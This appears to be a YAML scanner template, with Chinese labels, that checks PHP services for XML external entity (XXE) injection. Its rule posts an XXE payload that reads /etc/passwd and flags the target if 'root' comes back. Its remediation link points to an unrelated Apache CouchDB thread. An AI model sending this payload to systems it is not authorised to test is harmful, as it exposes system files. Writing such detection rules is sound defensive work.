set:
  r1: randomStr(5)
vulname: PHP环境 XML外部实体注入漏洞（XXE）
level: 高危
description: |
  PHP环境 XML外部实体注入
solution: |
  目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
  https://lists.apache.org/thread.html/6c405bf3f8358e6314076be9f48c89a2e0ddf00539906291ebdf0c67@%3Cdev.couchdb.apache.org%3E
rules:
  - method: POST
    headers:
      {
        'Content-Type':'application/xml'
      }
    data: |
      {
       <?xml version="1.0" encoding="utf-8"?>
      <!DOCTYPE xxe [
      <!ELEMENT name ANY >
      <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
      <root>
      <name>&xxe;</name>
      </root>
      }
    expression: response.status_code == 200 and response.content.__contains__(b"root")